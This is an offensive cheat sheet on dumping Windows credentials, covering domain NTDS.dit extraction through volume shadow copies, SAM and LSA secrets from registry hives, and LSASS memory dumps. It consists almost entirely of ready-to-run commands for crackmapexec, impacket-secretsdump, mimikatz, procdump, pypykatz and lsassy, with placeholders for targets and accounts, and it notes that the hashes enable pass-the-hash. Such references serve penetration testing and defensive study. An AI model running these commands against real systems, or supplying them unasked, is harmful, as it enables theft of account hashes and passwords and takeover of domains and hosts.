# Credentials Dumping
Uses the boot key to decrypt useful files:
```bash
reg SAVE HKLM\SYSTEM %SystemRoot%\Temp\SYSTEM
```

## NTDS.DIT
All domain account hashes & kerberos keys. The database is stored on the DC located in the NTDS folder of the system root. Hashes can be used for Pass The Hash attack (except cached hashes).
```bash
crackmapexec smb <IP> -d '<DOMAIN>' -u '<USER>' -p '<PASS>' --ntds

vssadmin create shadow /for=C:
copy <VOLUME_NAME>\Windows\NTDS\ntds.dit %SystemRoot%\Temp\NTDS
vssadmin delete shadows /shadow=<ID>
impacket-secretsdump -ntds <NTDS> -system <SYSTEM> LOCAL

lsadump::dcsync \all
```

## SAM
Security Account Manager (SAM) database contains all NTLM hashes for local accounts, stored at `HKLM\SAM` or `c:\system32\config\sam`. On a DC, it simply stores the administrator account from the time it was a server, which serves as the Directory Services Restore Mode (DSRM) recovery account.
```bash
crackmapexec smb <IP> -d '<DOMAIN>' -u '<USER>' -p '<PASS>' --sam

reg SAVE HKLM\SAM %SystemRoot%\Temp\SAM
impacket-secretsdump -sam <SAM> -system <SYSTEM> LOCAL
token::elevate lsadump::sam /system:<SYSTEM> /SAM:<SAM>

token::elevate lsadump::sam
```

## LSA secrets
Local Security Authority (LSA) contains cached secrets and keys, stored at `HKLM\SECURITY` or `c:\system32\config\security`.
```bash
crackmapexec smb <IP> -d '<DOMAIN>' -u '<USER>' -p '<PASS>' --lsa

reg SAVE HKLM\SECURITY %SystemRoot%\Temp\SECURITY
impacket-secretsdump -security <SECURITY> -system <SYSTEM> LOCAL

token::elevate lsadump::cache
token::elevate lsadump::lsa /inject # ? LOCAL ACCOUNTS?!
lsadump::secrets
```

## LSASS process
Local Security Authority Subsystem Service (LSASS) contains passwords and NTLM hashes, stored in lsass.exe.
```bash
crackmapexec smb <IP> -d '<DOMAIN>' -u '<USER>' -p '<PASS>' -M lsassy
lsassy -d '<DOMAIN>' -u '<USER>' -p '<PASS>' <IP>

tasklist /fi "imagename eq lsass.exe"
procdump.exe -accepteula -ma <PID> %SystemRoot%\Temp\lsass.dmp
pypykatz lsa minidump lsass.dmp

sekurlsa::logonPasswords
```




```bash
impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<IP>'
```